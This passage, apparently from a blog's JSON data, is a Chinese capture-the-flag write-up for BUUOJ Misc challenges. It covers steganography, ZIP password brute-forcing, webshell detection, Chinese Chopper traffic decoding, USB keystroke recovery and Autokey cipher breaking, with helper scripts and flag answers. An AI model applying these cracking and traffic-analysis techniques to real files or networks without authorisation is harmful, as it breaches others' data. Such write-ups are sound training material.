meting-tag-marker\"\n         data-id=\"39227593\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{270eae65-4c94-46e0-a891-b80828933c8c}</p>\r\n","categories":["Logs"],"tags":["Configuration"]},{"title":"BUUOJ刷题-Misc","url":"/2019/08/24/BUUOJ%E5%88%B7%E9%A2%98-Misc/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>开始刷<a href=\"https://buuoj.cn\">BUUOJ</a>的题了。留个日志。</p>\r\n<h1 id=\"签到\">签到</h1>\r\n<p>emmmm，最基本的签到格式。点击就送。 <a id=\"more\"></a> # 二维码</p>\r\n<p>打开是个PNG二维码图片。扫了发现提示“Secret is here”，然后拖进010 Editor，发现图片尾部有PK头，提出来是个ZIP压缩包。文件名为4number.txt，然后加密。猜测一下，压缩包被4位数字的密码加密，Ziprello破解就好了。7639。 <img src=\"/2019/08/24/BUUOJ%E5%88%B7%E9%A2%98-Misc/%E4%BA%8C%E7%BB%B4%E7%A0%81-1.png\" class=\"\" title=\"隐藏的ZIP压缩包\"></p>\r\n<h1 id=\"金三胖\">金三胖</h1>\r\n<p>打开是个GIF动态图。Stegsolve打开GIF，一共89帧，第21、51和79帧有三张flag图片。</p>\r\n<h1 id=\"n种方法解决\">N种方法解决</h1>\r\n<p>给了个KEY.EXE，010 Editor打开发现是个JPEG图片的Base64编码。直接把带上<code>data:image/jpg</code>的字符串丢到浏览器栏，直接出图片，扫一下就好了。</p>\r\n<h1 id=\"大白\">大白</h1>\r\n<p>给了个PNG图片，147KB，然而只有679*256大小，尺寸不太对。而且在XnView那里打不开，意味着图片格式有错误。拖进010 Editor那里，CRC那里错了，猜测是图片实际尺寸那里被修改了，把高改大一点，就可以了。 <img src=\"/2019/08/24/BUUOJ%E5%88%B7%E9%A2%98-Misc/%E5%A4%A7%E7%99%BD-1.png\" class=\"\" title=\"PNG图片大小调整\"></p>\r\n<h1 id=\"后门查杀webshell后门\">后门查杀（Webshell后门）</h1>\r\n<p>给了个压缩包，发现是网站源码。用D盾扫一下就出来了，include/include.php是一个PHPSpy大马，翻一下就有登录MD5。</p>\r\n<h1 id=\"flag\">FLAG</h1>\r\n<p>给了个PNG，丢到zsteg里，发现LSB有Zip压缩包。提出来发现是个ELF文件，执行给了flag。</p>\r\n<h1 id=\"我爱linux\">我爱Linux</h1>\r\n<p>给了个PNG，打不开，拖到010里发现JFIF，JPEG文件的标志，但是PNG的头，那就改过来，发现是张图片，不知道代表啥。文件尾部也有未知数据。Google识图发现是Monty Python，Python？？大胆猜一下是Python的相关数据。然后发现，这些数据似乎具有特定规律。猜一下是pickle。pickle.load发现确实是pickle数据。那就上脚本解了。</p>\r\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">import pickle</span><br><span class=\"line\">list1&#x3D;pickle.load(open(&#39;D:\\\\Onedrive\\\\Desktop\\\\noname1&#39;,&#39;rb&#39;))</span><br><span class=\"line\">for list in list1:</span><br><span class=\"line\">    #print(list)</span><br><span class=\"line\">    temp&#x3D;[&#39; &#39;]*100</span><br><span class=\"line\">    for item in list:</span><br><span class=\"line\">        #print(item)</span><br><span class=\"line\">        temp[item[0]]&#x3D;item[1]</span><br><span class=\"line\">    print(&quot;&quot;.join(temp))</span><br></pre></td></tr></table></figure>\r\n<p>然后就可以看出来了。</p>\r\n<h1 id=\"菜刀666\">菜刀666</h1>\r\n<p>给了个流量包。看题目名考察中国菜刀，中国菜刀每次通讯使用base64编码。打开后发现大量HTTP流量，我们base64解码就好了。在TCP Stream 7和9有异常。7的时候传了一个巨大的文件，我们提出来，注意到有z1和z2参数，z2参数传递的是16进制编码。转成文件后发现是个有文字的图片。Stream 9出现了Zip压缩包，提出来发现要密码。输入7提出来的图片所给的文字即可解压。</p>\r\n<h1 id=\"弱口令\">弱口令</h1>\r\n<p>给了个加密Zip，然后去用弱口令跑，没跑出来。发现有注释，空格与Tab符同时使用，那么我们把空格代表.，Tab代表-，换行代表中断，就会得到摩斯电码。.... . .-.. .-.. ----- ..-. --- .-. ..- -- 。HELL0FORUM，解压后得到PNG图片。LSB隐写。用cloacked-pixel提取flag。密码为123456。</p>\r\n<h1 id=\"被偷走的文件\">被偷走的文件</h1>\r\n<p>给了个Pcapng，打开后发现有FTP流量，提出来，发现有密码。RAR爆破得5790，打开就是Flag。</p>\r\n<h1 id=\"lsb\">LSB</h1>\r\n<p>给了个PNG图片。Stegsolve打开，然后Data Extraction，勾上R G B的0位，LSB模式，发现有另外一张PNG图片。Save bin后发现是张二维码。扫一下就能得flag。</p>\r\n<h1 id=\"刷新过的图片\">刷新过的图片</h1>\r\n<p>这个有点坑。。。刷新指的F5，有一个<a href=\"https://github.com/matthewgao/F5-steganography\">F5 Steganography</a>，解密出来个Zip，要密码，binwalk直接就提出来flag了。</p>\r\n<h1 id=\"基础破解\">基础破解</h1>\r\n<p>John the ripper用MASK模式?d?d?d?d直接过，2563</p>\r\n<h1 id=\"autokey\">AutoKey</h1>\r\n<p>给了个USB流量包，发现Leftover Data为8字节，猜测是USB键盘数据。tshark提出来<code>tshark -r task_AutoKey.pcapng -T fields -e usb.capdata &gt; capdata.txt</code>。然后对着USB HID的规范解数据。 <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\">mappings = &#123; <span class=\"number\">0x04</span>:<span class=\"string\">&quot;A&quot;</span>,  <span class=\"number\">0x05</span>:<span class=\"string\">&quot;B&quot;</span>,  <span class=\"number\">0x06</span>:<span class=\"string\">&quot;C&quot;</span>, <span class=\"number\">0x07</span>:<span class=\"string\">&quot;D&quot;</span>, <span class=\"number\">0x08</span>:<span class=\"string\">&quot;E&quot;</span>, <span class=\"number\">0x09</span>:<span class=\"string\">&quot;F&quot;</span>, <span class=\"number\">0x0A</span>:<span class=\"string\">&quot;G&quot;</span>,  <span class=\"number\">0x0B</span>:<span class=\"string\">&quot;H&quot;</span>, <span class=\"number\">0x0C</span>:<span class=\"string\">&quot;I&quot;</span>,  <span class=\"number\">0x0D</span>:<span class=\"string\">&quot;J&quot;</span>, <span class=\"number\">0x0E</span>:<span class=\"string\">&quot;K&quot;</span>, <span class=\"number\">0x0F</span>:<span class=\"string\">&quot;L&quot;</span>, <span class=\"number\">0x10</span>:<span class=\"string\">&quot;M&quot;</span>, <span class=\"number\">0x11</span>:<span class=\"string\">&quot;N&quot;</span>,<span class=\"number\">0x12</span>:<span class=\"string\">&quot;O&quot;</span>,  <span class=\"number\">0x13</span>:<span class=\"string\">&quot;P&quot;</span>, <span class=\"number\">0x14</span>:<span class=\"string\">&quot;Q&quot;</span>, <span class=\"number\">0x15</span>:<span class=\"string\">&quot;R&quot;</span>, <span class=\"number\">0x16</span>:<span class=\"string\">&quot;S&quot;</span>, <span class=\"number\">0x17</span>:<span class=\"string\">&quot;T&quot;</span>, <span class=\"number\">0x18</span>:<span class=\"string\">&quot;U&quot;</span>,<span class=\"number\">0x19</span>:<span class=\"string\">&quot;V&quot;</span>, <span class=\"number\">0x1A</span>:<span class=\"string\">&quot;W&quot;</span>, <span class=\"number\">0x1B</span>:<span class=\"string\">&quot;X&quot;</span>, <span class=\"number\">0x1C</span>:<span class=\"string\">&quot;Y&quot;</span>, <span class=\"number\">0x1D</span>:<span class=\"string\">&quot;Z&quot;</span>, <span class=\"number\">0x1E</span>:<span class=\"string\">&quot;1&quot;</span>, <span class=\"number\">0x1F</span>:<span class=\"string\">&quot;2&quot;</span>, <span class=\"number\">0x20</span>:<span class=\"string\">&quot;3&quot;</span>, <span class=\"number\">0x21</span>:<span class=\"string\">&quot;4&quot;</span>, <span class=\"number\">0x22</span>:<span class=\"string\">&quot;5&quot;</span>,  <span class=\"number\">0x23</span>:<span class=\"string\">&quot;6&quot;</span>, <span class=\"number\">0x24</span>:<span class=\"string\">&quot;7&quot;</span>, <span class=\"number\">0x25</span>:<span class=\"string\">&quot;8&quot;</span>, <span class=\"number\">0x26</span>:<span class=\"string\">&quot;9&quot;</span>, <span class=\"number\">0x27</span>:<span class=\"string\">&quot;0&quot;</span>, <span class=\"number\">0x28</span>:<span class=\"string\">&quot;n&quot;</span>, <span class=\"number\">0x2a</span>:<span class=\"string\">&quot;[DEL]&quot;</span>,  <span class=\"number\">0X2B</span>:<span class=\"string\">&quot;    &quot;</span>, <span class=\"number\">0x2C</span>:<span class=\"string\">&quot; &quot;</span>,  <span class=\"number\">0x2D</span>:<span class=\"string\">&quot;-&quot;</span>, <span class=\"number\">0x2E</span>:<span class=\"string\">&quot;=&quot;</span>, <span class=\"number\">0x2F</span>:<span class=\"string\">&quot;[&quot;</span>,  <span class=\"number\">0x30</span>:<span class=\"string\">&quot;]&quot;</span>,  <span class=\"number\">0x31</span>:<span class=\"string\">&quot;\\\\&quot;</span>, <span class=\"number\">0x32</span>:<span class=\"string\">&quot;~&quot;</span>, <span class=\"number\">0x33</span>:<span class=\"string\">&quot;;&quot;</span>,  <span class=\"number\">0x34</span>:<span class=\"string\">&quot;&#x27;&quot;</span>, <span class=\"number\">0x36</span>:<span class=\"string\">&quot;,&quot;</span>,  <span class=\"number\">0x37</span>:<span class=\"string\">&quot;.&quot;</span> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">nums = []</span><br><span class=\"line\"></span><br><span class=\"line\">keys = open(<span class=\"string\">r&#x27;C:\\Users\\Tiaonmmn\\capdata.txt&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> keys.readlines():</span><br><span class=\"line\">    print(len(line))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> line==<span class=\"string\">&quot;\\n&quot;</span> <span class=\"keyword\">or</span> line==<span class=\"string\">&quot;\\r&quot;</span> <span class=\"keyword\">or</span> len(line)!=<span class=\"number\">17</span>:</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\">    <span class=\"comment\">#print(line)</span></span><br><span class=\"line\">    print(line[<span class=\"number\">4</span>:<span class=\"number\">6</span>])</span><br><span class=\"line\">    nums.append(int(line[<span class=\"number\">4</span>:<span class=\"number\">6</span>],<span class=\"number\">16</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">print(nums)</span><br><span class=\"line\">result=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> nums:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        result+=mappings[item]</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\">    print(result)</span><br><span class=\"line\">print(result)</span><br></pre></td></tr></table></figure> 得到<code>AUTOKEY9'8888'0.DECIPHEER9'MPLRVFFCZEYOUJFJKYBXGZVDGQAURKXZOLKOLVTUFBLRNJESQITWAHXNSIJXPNMPLSHCJBTYHZEALOGVIAAISSPLFHLFSWFEHJNCRWHTINSMAMBVEXO[DEL]PZE[DEL]IZ'0</code>，其中[Del]是指Backspace键的向前删除，不是Del键的向后删除。因此我们要解的密文为\"MPLRVFFCZEYOUJFJKYBXGZVDGQAURKXZOLKOLVTUFBLRNJESQITWAHXNSIJXPNMPLSHCJBTYHZEALOGVIAAISSPLFHLFSWFEHJNCRWHTINSMAMBVEXPZIZ\"，Autokey加密。Google一下\"Autokey cipher brute force\"，搜到了这<a href=\"http://practicalcryptography.com/ciphers/autokey-cipher/\">篇文章</a>，下面有爆破脚本，要配合其他文件，一并放上。网站上的是Python2版本，我给改成3版的了。 <figure class=\"highlight python\"><figcaption><span>break_autokey.py</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> ngram_score <span class=\"keyword\">import</span> ngram_score</span><br><span class=\"line\"><span class=\"keyword\">from</span> pycipher <span class=\"keyword\">import</span> Autokey</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">from</span> itertools <span class=\"keyword\">import</span> permutations</span><br><span class=\"line\"></span><br><span class=\"line\">qgram = ngram_score(<span class=\"string\">&#x27;quadgrams.txt&#x27;</span>)</span><br><span class=\"line\">trigram = ngram_score(<span class=\"string\">&#x27;trigrams.txt&#x27;</span>)</span><br><span class=\"line\">ctext = <span class=\"string\">&#x27;MPLRVFFCZEYOUJFJKYBXGZVDGQAURKXZOLKOLVTUFBLRNJESQITWAHXNSIJXPNMPLSHCJBTYHZEALOGVIAAISSPLFHLFSWFEHJNCRWHTINSMAMBVEXPZIZ&#x27;</span></span><br><span class=\"line\">ctext = re.sub(<span class=\"string\">r&#x27;[^A-Z]&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, ctext.upper())</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># keep a list of the N best things we have seen, discard anything else</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">nbest</span>(<span class=\"params\">object</span>):</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self, N=<span class=\"number\">1000</span></span>):</span></span><br><span class=\"line\">        self.store = []</span><br><span class=\"line\">        self.N = N</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>(<span class=\"params\">self, item</span>):</span></span><br><span class=\"line\">        self.store.append(item)</span><br><span class=\"line\">        self.store.sort(reverse=<span class=\"literal\">True</span>)</span><br><span class=\"line\">        self.store = self.store[:self.N]</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__getitem__</span>(<span class=\"params\">self, k</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> self.store[k]</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__len__</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> len(self.store)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># init</span></span><br><span class=\"line\">N = <span class=\"number\">100</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> KLEN <span class=\"keyword\">in</span> range(<span class=\"number\">3</span>, <span class=\"number\">20</span>):</span><br><span class=\"line\">    rec = nbest(N)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> permutations(<span class=\"string\">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>, <span class=\"number\">3</span>):</span><br><span class=\"line\">        key = <span class=\"string\">&#x27;&#x27;</span>.join(i) + <span class=\"string\">&#x27;A&#x27;</span> * (KLEN - len(i))</span><br><span class=\"line\">        pt = Autokey(key).decipher(ctext)</span><br><span class=\"line\">        score = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>, len(ctext), KLEN):</span><br><span class=\"line\">            score += trigram.score(pt[j:j + <span class=\"number\">3</span>])</span><br><span class=\"line\">        rec.add((score, <span class=\"string\">&#x27;&#x27;</span>.join(i), pt[:<span class=\"number\">30</span>]))</span><br><span class=\"line\">    </span><br><span class=\"line\">    next_rec = nbest(N)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>, KLEN - <span class=\"number\">3</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> range(N):</span><br><span class=\"line\">            <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> <span class=\"string\">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>:</span><br><span class=\"line\">                key = rec[k][<span class=\"number\">1</span>] + c</span><br><span class=\"line\">                fullkey = key + <span class=\"string\">&#x27;A&#x27;</span> * (KLEN - len(key))</span><br><span class=\"line\">                pt = Autokey(fullkey).decipher(ctext)</span><br><span class=\"line\">                score = <span class=\"number\">0</span></span><br><span class=\"line\">                <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>, len(ctext), KLEN):</span><br><span class=\"line\">                    score += qgram.score(pt[j:j + len(key)])</span><br><span class=\"line\">                next_rec.add((score, key, pt[:<span class=\"number\">30</span>]))</span><br><span class=\"line\">        rec = next_rec</span><br><span class=\"line\">        next_rec = nbest(N)</span><br><span class=\"line\">    bestkey = rec[<span class=\"number\">0</span>][<span class=\"number\">1</span>]</span><br><span class=\"line\">    pt = Autokey(bestkey).decipher(ctext)</span><br><span class=\"line\">    bestscore = qgram.score(pt)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(N):</span><br><span class=\"line\">        pt = Autokey(rec[i][<span class=\"number\">1</span>]).decipher(ctext)</span><br><span class=\"line\">        score = qgram.score(pt)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> score &gt; bestscore:</span><br><span class=\"line\">            bestkey = rec[i][<span class=\"number\">1</span>]</span><br><span class=\"line\">            bestscore = score</span><br><span class=\"line\">    print(bestscore, <span class=\"string\">&#x27;autokey, klen&#x27;</span>, KLEN, <span class=\"string\">&#x27;:&quot;&#x27;</span> + bestkey + <span class=\"string\">&#x27;&quot;,&#x27;</span>, Autokey(bestkey).decipher(ctext))</span><br></pre></td></tr></table></figure> <figure class=\"highlight python\"><figcaption><span>ngram_score.py</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">Allows scoring of text using n-gram probabilities</span></span><br><span class=\"line\"><span class=\"string\">17/07/12</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> math <span class=\"keyword\">import</span> log10</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ngram_score</span>(<span class=\"params\">object</span>):</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self, ngramfile, sep=<span class=\"string\">&#x27; &#x27;</span></span>):</span></span><br><span class=\"line\">        <span class=\"string\">&#x27;&#x27;&#x27; load a file containing ngrams and counts, calculate log probabilities &#x27;&#x27;&#x27;</span></span><br><span class=\"line\">        self.ngrams = &#123;&#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> open(ngramfile).readlines():</span><br><span class=\"line\">            key, count = line.split(sep)</span><br><span class=\"line\">            self.ngrams[key] = int(count)</span><br><span class=\"line\">        self.L = len(key)</span><br><span class=\"line\">        self.N = sum(self.ngrams.values())</span><br><span class=\"line\">        <span class=\"comment\"># calculate log probabilities</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> key <span class=\"keyword\">in</span> list(self.ngrams.keys()):</span><br><span class=\"line\">            self.ngrams[key] = log10(float(self.ngrams[key]) / self.N)</span><br><span class=\"line\">        self.floor = log10(<span class=\"number\">0.01</span> / self.N)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">score</span>(<span class=\"params\">self, text</span>):</span></span><br><span class=\"line\">        <span class=\"string\">&#x27;&#x27;&#x27; compute the score of text &#x27;&#x27;&#x27;</span></span><br><span class=\"line\">        score = <span class=\"number\">0</span></span><br><span class=\"line\">        ngrams = self.ngrams.__getitem__</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(text) - self.L + <span class=\"number\">1</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> text[i:i + self.L] <span class=\"keyword\">in</span> self.ngrams:</span><br><span class=\"line\">                score += ngrams(text[i:i + self.L])</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                score += self.floor</span><br><span class=\"line\">        <span class=\"keyword\">return</span> score</span><br></pre></td></tr></table></figure> 相应的英文<a href=\"quadgrams.txt\">quadgrams.txt</a>和<a href=\"trigrams.txt\">trigrams.txt</a>。跑一遍会发现klen=8时发现flag<code>-674.9145695645551 autokey, klen 8 :\"FLAGHERE\", HELLOBOYSANDGIRLSYOUARESOSMARTTHATYOUCANFINDTHEFLAGTHATIHIDEINTHEKEYBOARDPACKAGEFLAGISJHAWLZKEWXHNCDHSLWBAQJTUQZDXZQPF</code>，所以flag是flag{JHAWLZKEWXHNCDHSLWBAQJTUQZDXZQPF}。</p>\r\n<p>后附USB HID规范： <div class=\"pdfobject-container\" data-target=\"hut1_12v2.pdf\" data-height=\"500px\"></div></p>\r\n<h1 id=\"printer\">Printer</h1>\r\n<p>[给了个USB流量包，打开发现有BULK_OUT，那就不是键盘或者鼠标了。按照包大小排序，476、674、675不对劲，这三个包出现了明文。在476包里看到了<code>CLS:PRINTER</code>，猜测是打印机的数据。搜一下是什么指令集<code>2MFG:4BARCODE;CMD:TSPL2;MDL:3B-363B;CLS:PRINTER;</code>。发现应该是BarTender的4BARCODE Seagull打印机，紧接着就看到了<a href=\"https://postorg.com.ua/published/file/TSC/TSPL_TSPL2_Programming.pdf\">指令集文档</a>。TSPL/TSPL2语言，重点是出现的BAR和BITMAP指令。那就Python画图吧。 <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"></span><br><span class=\"line\">img = Image.new(<span class=\"string\">&quot;RGB&quot;</span>, (<span class=\"number\">1024</span>, <span class=\"number\">1024</span>), <span class=\"string\">&quot;white&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">drawbar</span>():</span></span><br><span class=\"line\">    commands = <span class=\"string\">r&#x27;&#x27;&#x27;BAR 348, 439, 2, 96</span></span><br><span class=\"line\"><span class=\"string\">BAR 292, 535, 56, 2</span></span><br><span class=\"line\"><span class=\"string\">BAR 300, 495, 48, 2</span></span><br><span class=\"line\"><span class=\"string\">BAR 260, 447, 2, 88</span></span><br><span class=\"line\"><span class=\"string\">BAR 204, 447, 56, 2</span></span><br><span class=\"line\"><span class=\"string\">BAR 176, 447, 2, 96</span></span><br><span class=\"line\"><span class=\"string\">BAR 116, 455, 2, 82</span></span><br><span class=\"line\"><span class=\"string\">BAR 120, 479, 56, 2</span></span><br><span class=\"line\"><span class=\"string\">BAR 44, 535, 48, 2</span></span><br><span class=\"line\"><span class=\"string\">BAR 92, 455, 2, 80</span></span><br><span class=\"line\"><span class=\"string\">BAR 20, 455, 72, 2</span></span><br><span class=\"line\"><span class=\"string\">BAR 21, 455, 2, 40</span></span><br><span class=\"line\"><span class=\"string\">BAR 21, 495, 24, 2</span></span><br><span class=\"line\"><span class=\"string\">BAR 45, 479, 2, 16</span></span><br><span class=\"line\"><span class=\"string\">BAR 36, 479, 16, 2</span></span><br><span class=\"line\"><span class=\"string\">BAR 284, 391, 40, 2</span></span><br><span class=\"line\"><span class=\"string\">BAR 324, 343, 2, 48</span></span><br><span class=\"line\"><span class=\"string\">BAR 324, 287, 2, 32</span></span><br><span class=\"line\"><span class=\"string\">BAR 276, 287, 48, 2</span></span><br><span class=\"line\"><span class=\"string\">BAR 52, 311, 48, 2</span></span><br><span class=\"line\"><span class=\"string\">BAR 284, 239, 48, 2</span></span><br><span class=\"line\"><span class=\"string\">BAR 308, 183, 2, 56</span></span><br><span class=\"line\"><span class=\"string\">BAR 148, 239, 48, 2</span></span><br><span class=\"line\"><span class=\"string\">BAR 196, 191, 2, 48</span></span><br><span class=\"line\"><span class=\"string\">BAR 148, 191, 48, 2</span></span><br><span class=\"line\"><span class=\"string\">BAR 68, 191, 48, 2</span></span><br><span class=\"line\"><span class=\"string\">BAR 76, 151, 40, 2</span></span><br><span class=\"line\"><span class=\"string\">BAR 76, 119, 2, 32</span></span><br><span class=\"line\"><span class=\"string\">BAR 76, 55, 2, 32</span></span><br><span class=\"line\"><span class=\"string\">BAR 76, 55, 48, 2</span></span><br><span class=\"line\"><span class=\"string\">BAR 112, 535, 64, 2</span></span><br><span class=\"line\"><span class=\"string\">BAR 320, 343, 16, 2</span></span><br><span class=\"line\"><span class=\"string\">BAR 320, 319, 16, 2</span></span><br><span class=\"line\"><span class=\"string\">BAR 336, 319, 2, 24</span></span><br><span class=\"line\"><span class=\"string\">BAR 56, 120, 24, 2</span></span><br><span class=\"line\"><span class=\"string\">BAR 56, 87, 24, 2</span></span><br><span class=\"line\"><span class=\"string\">BAR 56, 88, 2, 32</span></span><br><span class=\"line\"><span class=\"string\">BAR 224, 247, 32, 2</span></span><br><span class=\"line\"><span class=\"string\">BAR 256, 215, 2, 32</span></span><br><span class=\"line\"><span class=\"string\">BAR 224, 215, 32, 2</span></span><br><span class=\"line\"><span class=\"string\">BAR 224, 184, 2, 32</span></span><br><span class=\"line\"><span class=\"string\">BAR 224, 191, 32, 2</span></span><br><span class=\"line\"><span class=\"string\">BAR 272, 311, 2, 56</span></span><br><span class=\"line\"><span class=\"string\">BAR 216, 367, 56, 2</span></span><br><span class=\"line\"><span class=\"string\">BAR 216, 319, 2, 48</span></span><br><span class=\"line\"><span class=\"string\">BAR 240, 318, 2, 49</span></span><br><span class=\"line\"><span class=\"string\">BAR 184, 351, 2, 16</span></span><br><span class=\"line\"><span class=\"string\">BAR 168, 351, 16, 2</span></span><br><span class=\"line\"><span class=\"string\">BAR 168, 311, 2, 40</span></span><br><span class=\"line\"><span class=\"string\">BAR 152, 351, 16, 2</span></span><br><span class=\"line\"><span class=\"string\">BAR 152, 351, 2, 16&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> commands.splitlines():</span><br><span class=\"line\">        line_data = line[<span class=\"number\">3</span>:].replace(<span class=\"string\">&quot; &quot;</span>, <span class=\"string\">&quot;&quot;</span>).split(<span class=\"string\">&quot;,&quot;</span>)</span><br><span class=\"line\">        x = int(line_data[<span class=\"number\">0</span>])</span><br><span class=\"line\">        y = int(line_data[<span class=\"number\">1</span>])</span><br><span class=\"line\">        width = int(line_data[<span class=\"number\">2</span>])</span><br><span class=\"line\">        height = int(line_data[<span class=\"number\">3</span>])</span><br><span class=\"line\">        <span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> range(x + width, x, <span class=\"number\">-1</span>):</span><br><span class=\"line\">            <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> range(y + height, y, <span class=\"number\">-1</span>):</span><br><span class=\"line\">                img.putpixel((a, b), (<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">drawbarcode</span>():</span></span><br><span class=\"line\">    data1 = bin(int(</span><br><span class=\"line\">        <span class=\"string\">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC3FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFE7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFE7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFE7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFE7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFE7FFE3FFFE1FFFFFFFFFF807C03C603FC07C07E0007F7FF01F8067FF007FF803FC07C03FFF1FF1F04F8FF1FF1FFF1FFF3FFCFF1F27FC7F1FF3E1FF1FF9FFFF1FF1FC1FCFF8FF1FFF1FFF3FFEFE3F87F8FF9FEFF8FF1FF9FFFF8FF1FC3FC7FCFF1FFF1FFF1FFEFC7FC7F9FF8FDFFC7F1FF9FFFF8FF1FC7FE3FC7F1FFF1FFF1FFEFCFFE7F1FF8F9FFC3F1FF9FFFFC7F1FC7FE3FE3F1FFF1FFF0FFEF8FFE7F1FF0FBFFE3F1FF9FFFFC7F1FC7FE3FE3F1FFF1FFF0FFEF8FFE7E1FF8F3FFE3F1FF9FFFFE3F1FC7FE3FF1F1FFF1FFF47FEF8FFE7E3FF9F7FFE1F1FF9FFFFE3F1FC7FF3FF8E1FFF1FFF47FEF9FFE7E3FFFFFFFF1F1FF9FFFFF1F1FC7FF3FF8C1FFF1FFF63FEF9FFE7F1FFFFFFFF1F1FF9FFFFF1F1FC7FF3FFC11FFF1FFF63FEF9FFE7F1FFFFFFFF1F1FF9FFFFF1F1FC7FE3FFE31FFF1FFF71FEF9FFE7F1FFFFFFFF1F1FF9FFFFF8F1FC7FE3FFE71FFF1FFF71FEF8FFE7F8FFFFFFFF0F1FF9FFFFF8F1FC7FE3FFCF1FFF1FFF78FEF8FFE7FCFFFFFFFF0F1FF9FFFFFC61FC7FE7FF9F1FFF1FFF78FEF8FFC7